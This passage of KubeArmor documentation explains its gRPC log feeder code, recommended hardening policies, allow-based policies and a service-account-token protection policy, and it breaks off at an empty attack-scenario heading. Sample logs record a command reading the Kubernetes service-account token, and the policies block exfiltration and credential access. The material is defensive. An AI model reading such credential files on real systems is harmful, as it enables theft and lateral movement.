   case fd.EventStructs.AlertStructs[uid].Broadcast <- &pbAlert: // Send to client's channel
   default:
                // If the client's channel is full, the message is dropped
    kg.Printf("alert channel busy, alert dropped.")
   }
  }
 } else {
        // It's a general system log type of event
  pbLog := pb.Log{}
  // Copy fields from internal log struct to pbLog struct
  pbLog.Timestamp = log.Timestamp
  // ... copy other fields like ContainerID, ProcessName, Resource ...

        // Broadcast the pbLog to all connected clients watching logs
  fd.EventStructs.LogLock.Lock() // Lock for safe concurrent access
  defer fd.EventStructs.LogLock.Unlock()
  for uid := range fd.EventStructs.LogStructs {
   select {
   case fd.EventStructs.LogStructs[uid].Broadcast <- &pbLog: // Send to client's channel
   default:
                // If the client's channel is full, the message is dropped
    kg.Printf("log channel busy, log dropped.")
   }
  }
 }
}
```

**Explanation:**

* `NewFeeder`: This function, called during Daemon initialization, sets up the data structures (`EventStructs`) to manage client connections, creates a network listener for the configured gRPC port, and creates and registers the gRPC server (`LogServer`). It passes a reference to `EventStructs` and other data to the `LogService` implementation.
* `ServeLogFeeds`: This function is run as a goroutine by the KubeArmor Daemon. It calls `LogServer.Serve()`, which makes the gRPC server start listening for incoming client connections and handling gRPC requests.
* `PushLog`: This method is called by the KubeArmor Daemon (specifically, the part that processes events from the System Monitor) whenever a new security event or log needs to be reported. It takes KubeArmor's internal `tp.Log` structure, converts it into the appropriate Protobuf message (`pb.Alert` or `pb.Log`), and then iterates through all registered client connections (stored in `EventStructs`) broadcasting the message to their respective Go channels (`Broadcast`). If a client isn't reading fast enough, the message might be dropped due to the channel buffer being full.

Now let's see the client-side handling logic within the Log Feeder's gRPC service implementation.

Referencing `KubeArmor/feeder/logServer.go`:

```go
// LogService Struct (Simplified)
type LogService struct {
 QueueSize    int // Max size of the channel buffer for each client
 EventStructs *EventStructs // Pointer to the feeder's connection store
 Running      *bool // Pointer to the feeder's running status
}

// WatchAlerts Function (Simplified - gRPC handler)
// This function is called by the gRPC server whenever a client calls the WatchAlerts RPC
func (ls *LogService) WatchAlerts(req *pb.RequestMessage, svr pb.LogService_WatchAlertsServer) error {
 // req contains client's request (e.g., filter options)
 // svr is the gRPC server stream to send messages back to the client

 // Add this client connection to the feeder's connection store
 // This creates a new Go channel for this specific client
 uid, conn := ls.EventStructs.AddAlertStruct(req.Filter, ls.QueueSize)
 kg.Printf("Added a new client (%s, %s) for WatchAlerts", uid, req.Filter)

 defer func() {
  // This code runs when the client disconnects or an error occurs
  close(conn) // Close the channel
  ls.EventStructs.RemoveAlertStruct(uid) // Remove from the store
  kg.Printf("Deleted the client (%s) for WatchAlerts", uid)
 }()

    // Loop continuously while KubeArmor is running and the client is connected
 for *ls.Running {
  select {
  case <-svr.Context().Done():
            // Client disconnected, exit the loop
   return nil
  case resp := <-conn:
            // A new pb.Alert message arrived on the client's channel (pushed by PushLog)
   if err := kl.HandleGRPCErrors(svr.Send(resp)); err != nil {
                // Failed to send to the client (e.g., network issue)
    kg.Warnf("Failed to send an alert=[%+v] err=[%s]", resp, err.Error())
    return err // Exit the loop with an error
   }
  }
 }

 return nil // KubeArmor is shutting down, exit gracefully
}

// WatchLogs Function (Simplified - gRPC handler, similar to WatchAlerts)
// This function is called by the gRPC server whenever a client calls the WatchLogs RPC
func (ls *LogService) WatchLogs(req *pb.RequestMessage, svr pb.LogService_WatchLogsServer) error {
    // ... Similar logic to WatchAlerts, but uses AddLogStruct, RemoveLogStruct,
    // and reads from the LogStructs' Broadcast channel to send pb.Log messages ...
    return nil // Simplified
}
```

**Explanation:**

* `LogService`: This struct is the concrete implementation of the gRPC service defined in `protobuf/kubearmor.proto`. It holds references to the feeder's state.
* `WatchAlerts`: This method is a gRPC *streaming RPC* handler. When a client initiates a `WatchAlerts` call, this function is executed. It creates a dedicated Go channel (`conn`) for that client using `AddAlertStruct`. Then, it enters a `for` loop. Inside the loop, it waits for either the client to disconnect (`<-svr.Context().Done()`) or for a new `pb.Alert` message to appear on the client's dedicated channel (`<-conn`). When a message arrives, it sends it over the gRPC stream back to the client using `svr.Send(resp)`. This creates the real-time streaming behavior.
* `WatchLogs`: This method is similar to `WatchAlerts` but handles subscriptions for general system logs (`pb.Log` messages).

This shows how the Log Feeder's gRPC server manages multiple concurrent client connections, each with its own channel, ensuring that events pushed by `PushLog` are delivered to all interested subscribers efficiently.

## Connecting to the Log Feeder

The most common way to connect to the Log Feeder is using the `karmor` command-line tool provided with KubeArmor.

To watch security alerts:

```bash
karmor log --alert
```

To watch system logs:

```bash
karmor log --log
```

To watch both alerts and logs:

```bash
karmor log --alert --log
```

These commands are simply gRPC clients that connect to the KubeArmor Daemon's Log Feeder port on your nodes (or via the KubeArmor Relay service if configured) and call the `WatchAlerts` and `WatchLogs` gRPC methods.

You can also specify filters (e.g., by namespace or policy name) using `karmor log` options, which the Log Feeder's gRPC handlers can process (although the code snippets above show a simplified filter handling).

For integration with other systems, you would write a custom gRPC client application in your preferred language (Go, Python, Java, etc.) using the KubeArmor Protobuf definitions to connect to the feeder and consume the streams.

## Log Feeder Components Summary

| Component            | Description                                                                          | Located In                 | KubeArmor Role                                   |
| -------------------- | ------------------------------------------------------------------------------------ | -------------------------- | ------------------------------------------------ |
| **gRPC Server**      | Listens for incoming client connections and handles RPC calls.                       | `feeder/feeder.go`         | Exposes event streams to external clients.       |
| **LogService**       | Implementation of the gRPC service methods (`WatchAlerts`, `WatchLogs`).             | `feeder/logServer.go`      | Manages client connections and streams events.   |
| **EventStructs**     | Internal data structure (maps of channels) holding connections for each client type. | `feeder/feeder.go`         | Enables broadcasting events to multiple clients. |
| **Protobuf Defs**    | Define the structure of `Alert` and `Log` messages.                                  | `protobuf/kubearmor.proto` | Standardizes the output format.                  |
| **`PushLog` method** | Method on the `Feeder` called by the Daemon to send new events.                      | `feeder/feeder.go`         | Point of entry for events into the feeder.       |

## Conclusion

The Log Feeder is your essential window into KubeArmor's activity. By collecting enriched security events and telemetry from the System Monitor and Runtime Enforcer, formatting them using Protobuf, and streaming them over a gRPC interface, it provides real-time visibility into policy violations (alerts) and system behavior (logs). Tools like `karmor log` and integrations with SIEM systems rely on the Log Feeder to deliver crucial security insights from your KubeArmor-protected environment.

This chapter concludes our detailed look into the core components of KubeArmor! You now have a foundational understanding of how KubeArmor defines policies, identifies workloads, enforces rules, monitors system activity using eBPF, orchestrates these actions with the Daemon, and reports everything via the Log Feeder.

Thank you for following this tutorial series! We hope it has provided a clear and beginner-friendly introduction to the fascinating world of KubeArmor.

# Harden Infrastructure

![Hardening Policies](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-0adfde06e75a6480b1442953f1702dda7c4e8f8e%2Fharden-workloads.png?alt=media\&token=317b2cb9-17ff-4878-af34-c44be79aab2f)

KubeArmor is a security solution for the Kubernetes and cloud native platforms that helps protect your workloads from attacks and threats. It does this by providing a set of hardening policies that are based on industry-leading compliance and attack frameworks such as CIS, MITRE, NIST-800-53, and STIGs. These policies are designed to help you secure your workloads in a way that is compliant with these frameworks and recommended best practices.

One of the key features of KubeArmor is that it provides these hardening policies out-of-the-box, meaning that you don't have to spend time researching and configuring them yourself. Instead, you can simply apply the policies to your workloads and immediately start benefiting from the added security that they provide.

Additionally, KubeArmor presents these hardening policies in the context of your workload, so you can see how they will be applied and what impact they will have on your system. This allows you to make informed decisions about which policies to apply, and helps you understand the trade-offs between security and functionality.

Overall, KubeArmor is a powerful tool for securing your Kubernetes workloads, and its out-of-the-box hardening policies based on industry-leading compliance and attack frameworks make it easy to get started and ensure that your system is as secure as possible.

## What is the source of these hardening policies?

Hardening policies are derived from industry leading compliance standards and attack frameworks such as CIS, MITRE, NIST, STIGs, and several others.[KubeArmor Policy Templates](https://github.com/kubearmor/policy-templates/) contains the latest hardening policies.\
KubeArmor client tool (karmor) provides a way (`karmor recommend`) to fetch the policies in the context of the kubernetes workloads or specific container using command line.\
The output is a set of [`KubeArmorPolicy`](https://docs.kubearmor.io/kubearmor/documentation/security_policy_specification) or [`KubeArmorHostPolicy`](https://docs.kubearmor.io/kubearmor/documentation/host_security_policy_specification) that can be applied using k8s native tools (such as `kubectl apply`).

The rules in hardening policies are based on inputs from:

1. [MITRE TTPs](https://attack.mitre.org/)
2. [Security Technical Implementation Guides (STIGs)](https://public.cyber.mil/stigs/)
3. [NIST SP 800-53A](https://csrc.nist.gov/publications/detail/sp/800-53a/rev-4/final)
4. [Center for Internet Security (CIS)](https://www.cisecurity.org/cis-benchmarks/)
5. Several others...

## How to fetch hardening policies?

Pre-requisites:

1. Install KubeArmor
   * `curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin && karmor install`
2. Get the hardening policies in context of all the deployment in namespace NAMESPACE:
   * `karmor recommend -n NAMESPACE`
   * The recommended policies would be available in the `out` folder.

## Sample recommended hardening policies

```
❯ karmor recommend -n dvwa
INFO[0000] pulling image                                 image="cytopia/dvwa:php-8.1"
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-maintenance-tool-access.yaml ...
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-cert-access.yaml ...
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-system-owner-discovery.yaml ...
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-system-monitoring-deny-write-under-bin-directory.yaml ...
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-system-monitoring-write-under-dev-directory.yaml ...
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-system-monitoring-detect-access-to-cronjob-files.yaml ...
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-least-functionality-execute-package-management-process-in-container.yaml ...
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-deny-remote-file-copy.yaml ...
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-deny-write-in-shm-folder.yaml ...
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-deny-write-under-etc-directory.yaml ...
created policy out/dvwa-dvwa-web/cytopia-dvwa-php-8-1-deny-write-under-etc-directory.yaml ...
INFO[0000] pulling image                                 image="mariadb:10.1"
created policy out/dvwa-dvwa-mysql/mariadb-10-1-maintenance-tool-access.yaml ...
created policy out/dvwa-dvwa-mysql/mariadb-10-1-cert-access.yaml ...
created policy out/dvwa-dvwa-mysql/mariadb-10-1-system-owner-discovery.yaml ...
created policy out/dvwa-dvwa-mysql/mariadb-10-1-system-monitoring-deny-write-under-bin-directory.yaml ...
created policy out/dvwa-dvwa-mysql/mariadb-10-1-system-monitoring-write-under-dev-directory.yaml ...
created policy out/dvwa-dvwa-mysql/mariadb-10-1-system-monitoring-detect-access-to-cronjob-files.yaml ...
created policy out/dvwa-dvwa-mysql/mariadb-10-1-least-functionality-execute-package-management-process-in-container.yaml ...
created policy out/dvwa-dvwa-mysql/mariadb-10-1-deny-remote-file-copy.yaml ...
created policy out/dvwa-dvwa-mysql/mariadb-10-1-deny-write-in-shm-folder.yaml ...
created policy out/dvwa-dvwa-mysql/mariadb-10-1-deny-write-under-etc-directory.yaml ...
created policy out/dvwa-dvwa-mysql/mariadb-10-1-deny-write-under-etc-directory.yaml ...
output report in out/report.txt ...
  Deployment              | dvwa/dvwa-web         
  Container               | cytopia/dvwa:php-8.1  
  OS                      | linux                 
  Arch                    |                       
  Distro                  |                       
  Output Directory        | out/dvwa-dvwa-web     
  policy-template version | v0.1.6                
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
|               POLICY                |           SHORT DESC           | SEVERITY | ACTION |                       TAGS                        |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-maintenance-   | Restrict access to maintenance | 1        | Block  | PCI_DSS                                           |
| tool-access.yaml                    | tools (apk, mii-tool, ...)     |          |        | MITRE                                             |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-cert-          | Restrict access to trusted     | 1        | Block  | MITRE                                             |
| access.yaml                         | certificated bundles in the OS |          |        | MITRE_T1552_unsecured_credentials                 |
|                                     | image                          |          |        |                                                   |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-system-owner-  | System Information Discovery   | 3        | Block  | MITRE                                             |
| discovery.yaml                      | - block system owner discovery |          |        | MITRE_T1082_system_information_discovery          |
|                                     | commands                       |          |        |                                                   |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-system-        | System and Information         | 5        | Block  | NIST NIST_800-53_AU-2                             |
| monitoring-deny-write-under-bin-    | Integrity - System Monitoring  |          |        | NIST_800-53_SI-4 MITRE                            |
| directory.yaml                      | make directory under /bin/     |          |        | MITRE_T1036_masquerading                          |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-system-        | System and Information         | 5        | Audit  | NIST NIST_800-53_AU-2                             |
| monitoring-write-under-dev-         | Integrity - System Monitoring  |          |        | NIST_800-53_SI-4 MITRE                            |
| directory.yaml                      | make files under /dev/         |          |        | MITRE_T1036_masquerading                          |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-system-        | System and Information         | 5        | Audit  | NIST SI-4                                         |
| monitoring-detect-access-to-        | Integrity - System Monitoring  |          |        | NIST_800-53_SI-4                                  |
| cronjob-files.yaml                  | Detect access to cronjob files |          |        |                                                   |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-least-         | System and Information         | 5        | Block  | NIST                                              |
| functionality-execute-package-      | Integrity - Least              |          |        | NIST_800-53_CM-7(4)                               |
| management-process-in-              | Functionality deny execution   |          |        | SI-4 process                                      |
| container.yaml                      | of package manager process in  |          |        | NIST_800-53_SI-4                                  |
|                                     | container                      |          |        |                                                   |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-deny-remote-   | The adversary is trying to     | 5        | Block  | MITRE                                             |
| file-copy.yaml                      | steal data.                    |          |        | MITRE_TA0008_lateral_movement                     |
|                                     |                                |          |        | MITRE_TA0010_exfiltration                         |
|                                     |                                |          |        | MITRE_TA0006_credential_access                    |
|                                     |                                |          |        | MITRE_T1552_unsecured_credentials                 |
|                                     |                                |          |        | NIST_800-53_SI-4(18) NIST                         |
|                                     |                                |          |        | NIST_800-53 NIST_800-53_SC-4                      |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-deny-write-in- | The adversary is trying to     | 5        | Block  | MITRE_execution                                   |
| shm-folder.yaml                     | write under shm folder         |          |        | MITRE                                             |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-deny-write-    | The adversary is trying to     | 5        | Block  | NIST_800-53_SI-7 NIST                             |
| under-etc-directory.yaml            | avoid being detected.          |          |        | NIST_800-53_SI-4 NIST_800-53                      |
|                                     |                                |          |        | MITRE_T1562.001_disable_or_modify_tools           |
|                                     |                                |          |        | MITRE_T1036.005_match_legitimate_name_or_location |
|                                     |                                |          |        | MITRE_TA0003_persistence                          |
|                                     |                                |          |        | MITRE MITRE_T1036_masquerading                    |
|                                     |                                |          |        | MITRE_TA0005_defense_evasion                      |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| cytopia-dvwa-php-8-1-deny-write-    | Adversaries may delete or      | 5        | Block  | NIST NIST_800-53 NIST_800-53_CM-5                 |
| under-etc-directory.yaml            | modify artifacts generated     |          |        | NIST_800-53_AU-6(8)                               |
|                                     | within systems to remove       |          |        | MITRE_T1070_indicator_removal_on_host             |
|                                     | evidence.                      |          |        | MITRE MITRE_T1036_masquerading                    |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+

  Deployment              | dvwa/dvwa-mysql      
  Container               | mariadb:10.1         
  OS                      | linux                
  Arch                    |                      
  Distro                  |                      
  Output Directory        | out/dvwa-dvwa-mysql  
  policy-template version | v0.1.6               
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
|               POLICY                |           SHORT DESC           | SEVERITY | ACTION |                       TAGS                        |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-maintenance-tool-      | Restrict access to maintenance | 1        | Block  | PCI_DSS                                           |
| access.yaml                         | tools (apk, mii-tool, ...)     |          |        | MITRE                                             |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-cert-access.yaml       | Restrict access to trusted     | 1        | Block  | MITRE                                             |
|                                     | certificated bundles in the OS |          |        | MITRE_T1552_unsecured_credentials                 |
|                                     | image                          |          |        |                                                   |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-system-owner-          | System Information Discovery   | 3        | Block  | MITRE                                             |
| discovery.yaml                      | - block system owner discovery |          |        | MITRE_T1082_system_information_discovery          |
|                                     | commands                       |          |        |                                                   |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-system-monitoring-     | System and Information         | 5        | Block  | NIST NIST_800-53_AU-2                             |
| deny-write-under-bin-directory.yaml | Integrity - System Monitoring  |          |        | NIST_800-53_SI-4 MITRE                            |
|                                     | make directory under /bin/     |          |        | MITRE_T1036_masquerading                          |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-system-monitoring-     | System and Information         | 5        | Audit  | NIST NIST_800-53_AU-2                             |
| write-under-dev-directory.yaml      | Integrity - System Monitoring  |          |        | NIST_800-53_SI-4 MITRE                            |
|                                     | make files under /dev/         |          |        | MITRE_T1036_masquerading                          |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-system-monitoring-     | System and Information         | 5        | Audit  | NIST SI-4                                         |
| detect-access-to-cronjob-files.yaml | Integrity - System Monitoring  |          |        | NIST_800-53_SI-4                                  |
|                                     | Detect access to cronjob files |          |        |                                                   |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-least-functionality-   | System and Information         | 5        | Block  | NIST                                              |
| execute-package-management-process- | Integrity - Least              |          |        | NIST_800-53_CM-7(4)                               |
| in-container.yaml                   | Functionality deny execution   |          |        | SI-4 process                                      |
|                                     | of package manager process in  |          |        | NIST_800-53_SI-4                                  |
|                                     | container                      |          |        |                                                   |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-deny-remote-file-      | The adversary is trying to     | 5        | Block  | MITRE                                             |
| copy.yaml                           | steal data.                    |          |        | MITRE_TA0008_lateral_movement                     |
|                                     |                                |          |        | MITRE_TA0010_exfiltration                         |
|                                     |                                |          |        | MITRE_TA0006_credential_access                    |
|                                     |                                |          |        | MITRE_T1552_unsecured_credentials                 |
|                                     |                                |          |        | NIST_800-53_SI-4(18) NIST                         |
|                                     |                                |          |        | NIST_800-53 NIST_800-53_SC-4                      |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-deny-write-in-shm-     | The adversary is trying to     | 5        | Block  | MITRE_execution                                   |
| folder.yaml                         | write under shm folder         |          |        | MITRE                                             |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-deny-write-under-etc-  | The adversary is trying to     | 5        | Block  | NIST_800-53_SI-7 NIST                             |
| directory.yaml                      | avoid being detected.          |          |        | NIST_800-53_SI-4 NIST_800-53                      |
|                                     |                                |          |        | MITRE_T1562.001_disable_or_modify_tools           |
|                                     |                                |          |        | MITRE_T1036.005_match_legitimate_name_or_location |
|                                     |                                |          |        | MITRE_TA0003_persistence                          |
|                                     |                                |          |        | MITRE MITRE_T1036_masquerading                    |
|                                     |                                |          |        | MITRE_TA0005_defense_evasion                      |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
| mariadb-10-1-deny-write-under-etc-  | Adversaries may delete or      | 5        | Block  | NIST NIST_800-53 NIST_800-53_CM-5                 |
| directory.yaml                      | modify artifacts generated     |          |        | NIST_800-53_AU-6(8)                               |
|                                     | within systems to remove       |          |        | MITRE_T1070_indicator_removal_on_host             |
|                                     | evidence.                      |          |        | MITRE MITRE_T1036_masquerading                    |
+-------------------------------------+--------------------------------+----------+--------+---------------------------------------------------+
```

Key highlights:

1. The hardening policies are available by default in the `out` folder separated out in directories based on deployment names.
2. Get an HTML report by using the option `--report report.html` with `karmor recommend`.
3. Get hardening policies in context to specific compliance by specifying `--tag <CIS/MITRE/...>` option.

# Least Permissive Access

KubeArmor helps organizations enforce a zero trust posture within their Kubernetes clusters. It allows users to define an allow-based policy that allows specific operations, and denies or audits all other operations. This helps to ensure that only authorized activities are allowed within the cluster, and that any deviations from the expected behavior are denied and flagged for further investigation.

By implementing a zero trust posture with KubeArmor, organizations can increase their security posture and reduce the risk of unauthorized access or activity within their Kubernetes clusters. This can help to protect sensitive data, prevent system breaches, and maintain the integrity of the cluster.

KubeArmor supports allow-based policies which results in specific actions to be allowed and denying/auditing everything else. For example, a specific pod/container might only invoke a set of binaries at runtime. As part of allow-based rules you can specify the set of processes that are allowed and everything else is either audited or denied based on the [default security posture](https://docs.kubearmor.io/kubearmor/documentation/default_posture).

![KubeArmor enforcing Zero Trust Posture](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-73969a8959647f3405d76b16d91b43a87b2aab83%2Fzero-trust.png?alt=media\&token=db44e4df-d7b7-4260-bf59-5268904e86f0)

## Allow execution of only specific processes within the pod

1. Install the nginx deployment using
   * `kubectl create deployment nginx --image=nginx`.
2. Set the default security posture to default-deny.
   * `kubectl annotate ns default kubearmor-file-posture=block --overwrite`
3. Apply the following policy:

```
cat <<EOF | kubectl apply -f -
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: only-allow-nginx-exec
spec:
  selector:
    matchLabels:
      app: nginx
  file:
    matchDirectories:
    - dir: /
      recursive: true  
  process:
    matchPaths:
    - path: /usr/sbin/nginx
    - path: /bin/bash
  action:
    Allow
EOF
```

Observe that the policy contains Allow action. Once there is any KubeArmor policy having Allow action then the pods enter least permissive mode, allowing only explicitly allowed operations.

> Note: Use kubectl port-forward $POD --address 0.0.0.0 8080:80 to access nginx and you can see that the nginx web access still works normally.

Lets try to execute some other processes:

```
kubectl exec -it $POD -- bash -c "chroot"
```

This would be permission denied.

## Challenges with maintaining Zero Trust Security Posture

Achieving Zero Trust Security Posture is difficult. However, the more difficult part is to maintain the Zero Trust posture across application updates. There is also a risk of application downtime if the security posture is not correctly identified. While KubeArmor provides a way to enforce Zero Trust Security Posture, identifying the policies/rules for achieving this is non-trivial and requires that you keep the policies in dry-run mode (or default audit mode) before using the default-deny mode.

KubeArmor provides framework so as to smoothen the journey to Zero Trust posture. For e.g., it is possible to set dry-run/audit mode at the namespace level by [configuring security posture](https://docs.kubearmor.io/kubearmor/documentation/default_posture). Thus, you can have different namespaces in different default security posture modes (default-deny vs default-audit). Users can switch to default-deny mode once they are comfortable (i.e., they do not see any alerts) with the settings.

# Application Behavior

KubeArmor has visibility into systems and application behavior. KubeArmor\
summarizes/aggregates the information and provides a user-friendly view to\
figure out the application behavior.

![App Behavior](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-4093b21961e410c769e3845db4d0f989d168eaa7%2Fapp-behavior.png?alt=media\&token=2eb166e9-199c-4e66-9e73-730c8e7d269f)

## What application behavior is shown?

![App Behavior2](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-e03473e17001b79fbe888cbe4f3803545454beef%2Fapp-behavior2.png?alt=media\&token=80e39aca-b45a-41c1-8fef-1c60ab251057)

* *Process data*:
  * What are the processes executing in the pods?
  * What processes are executing through which parent processes?
* *File data*:
  * What are the file system accesses made by different processes?
* *Network Accesses*:
  * What are the Ingress/Egress connections from the pod?
  * What server binds are done in the pod?

## How to get the application behavior?

```
karmor logs -n default --json --logFilter all --operation process
```

Get visibility into process executions in `default` namespace.

```json
{
  "Timestamp": 1686491023,
  "UpdatedTime": "2023-06-11T13:43:43.289380Z",
  "ClusterName": "default",
  "HostName": "ip-172-31-24-142",              
  "NamespaceName": "default",                  
  "PodName": "nginx-8f458dc5b-fl42t",
  "Labels": "app=nginx",                                                                       
  "ContainerID": "8762eafc25a35ab90089f79703b86659989e8e547c2c029fb60f55d884355000",           
  "ContainerName": "nginx",            
  "ContainerImage": "docker.io/library/nginx:latest@sha256:af296b188c7b7df99ba960ca614439c99cb7cf252ed7bbc23e90cfda59092305",
  "ParentProcessName": "/x86_64-bottlerocket-linux-gnu/sys-root/usr/bin/runc",                 
  "ProcessName": "/bin/sh",
  "HostPPID": 3488352,                         
  "HostPID": 3488357,                          
  "PPID": 3488352,                             
  "PID": 832,                                  
  "Type": "ContainerLog",
  "Source": "/x86_64-bottlerocket-linux-gnu/sys-root/usr/bin/runc",                            
  "Operation": "Process",
  "Resource": "/bin/sh -c cat /run/secrets/kubernetes.io/serviceaccount/token",                
  "Data": "syscall=SYS_EXECVE",
  "Result": "Passed"                           
}                                              
{                                              
  "Timestamp": 1686491023,
  "UpdatedTime": "2023-06-11T13:43:43.291471Z",
  "ClusterName": "default",
  "HostName": "ip-172-31-24-142",
  "NamespaceName": "default",
  "PodName": "nginx-8f458dc5b-fl42t",
  "Labels": "app=nginx",
  "ContainerID": "8762eafc25a35ab90089f79703b86659989e8e547c2c029fb60f55d884355000",           
  "ContainerName": "nginx",
  "ContainerImage": "docker.io/library/nginx:latest@sha256:af296b188c7b7df99ba960ca614439c99cb7cf252ed7bbc23e90cfda59092305",
  "ParentProcessName": "/bin/dash",
  "ProcessName": "/bin/cat",
  "HostPPID": 3488357,                         
  "HostPID": 3488363,                          
  "PPID": 832,                                 
  "PID": 838,                                  
  "Type": "ContainerLog",
  "Source": "/bin/dash",
  "Operation": "Process",
  "Resource": "/bin/cat /run/secrets/kubernetes.io/serviceaccount/token",                      
  "Data": "syscall=SYS_EXECVE",
  "Result": "Passed"                           
}
```

# Advanced

<details>

<summary>Service Account token: Protect access to k8s service account token</summary>

#### Description

K8s mounts the service account token as part of every pod by default. The service account token is a credential that can be used as a bearer token to access k8s APIs and gain access to other k8s entities. Many times there are no processes in the pod that use the service account tokens which means in such cases the k8s service account token is an unused asset that can be leveraged by the attacker.

#### Attack Scenario

It's important to note that attackers often look for ways to gain access to other entities within Kubernetes clusters. One common method is to check for credential accesses, such as service account tokens, in order to perform lateral movements. For instance, in many Kubernetes attacks, once the attacker gains entry into a pod, they may attempt to use a service account token to access other entities.\
**Attack type** Credential Access, Comand Injection\
**Actual Attack** Hildegard, BlackT, BlackCat RaaS

#### Compliance

* CIS\_Kubernetes\_Benchmark\_v1.27, Control-Id-5.1.6

### Policy

#### Service account token

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-wordpress-block-service-account
  namespace: wordpress-mysql
spec:
  severity: 2
  selector:
    matchLabels:
      app: wordpress
  file:
    matchDirectories:
      - dir: /run/secrets/kubernetes.io/serviceaccount/
        recursive: true
  action: Block
```

**Simulation**

```sh
root@wordpress-7c966b5d85-42jwx:/# cd /run/secrets/kubernetes.io/serviceaccount/ 
root@wordpress-7c966b5d85-42jwx:/run/secrets/kubernetes.io/serviceaccount# ls 
ls: cannot open directory .: Permission denied 
root@wordpress-7c966b5d85-42jwx:/run/secrets/kubernetes.io/serviceaccount# 
```

**Expected Alert**

```
{
  "ATags": null,
  "Action": "Block",
  "ClusterName": "deathiscoming",
  "ContainerID": "bbf968e6a75f0b4412478770911c6dd05d5a83ec97ca38872246e89c31e9d41a",
  "ContainerImage": "docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845",
  "ContainerName": "wordpress",
  "Data": "syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC",
  "Enforcer": "AppArmor",
  "HashID": "f1c272d8d75bdd91b9c4d1dc74c8d0f222bf4ecd0008c3a22a54706563ec5827",
  "HostName": "aditya",
  "HostPID": 11105,
  "HostPPID": 10997,
  "Labels": "app=wordpress",
  "Message": "",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "",
    "Namespace": "",
    "Ref": ""
  },
  "PID": 204,
  "PPID": 194,
  "PodName": "wordpress-7c966b5d85-42jwx",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/bin/ls",
  "Resource": "/run/secrets/kubernetes.io/serviceaccount",
  "Result": "Permission denied",
  "Severity": "",
  "Source": "/bin/ls",
  "Tags": "",
  "Timestamp": 1695903189,
  "Type": "MatchedPolicy",
  "UID": 0,
  "UpdatedTime": "2023-09-28T12:13:09.159252Z",
  "cluster_id": "3664",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "workload": "1"
}
```

### References

[MITRE T1528: Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)<br>

</details>

<details>

<summary>FIM: File Integrity Monitoring/Protection</summary>

#### Description

Changes to system binary folders, configuration paths, and credentials paths need to be monitored for change. With KubeArmor, one can not only monitor for changes but also block any write attempts in such system folders. Compliance frameworks such as PCI-DSS, NIST, and CIS expect FIM to be in place.

#### Attack Scenario

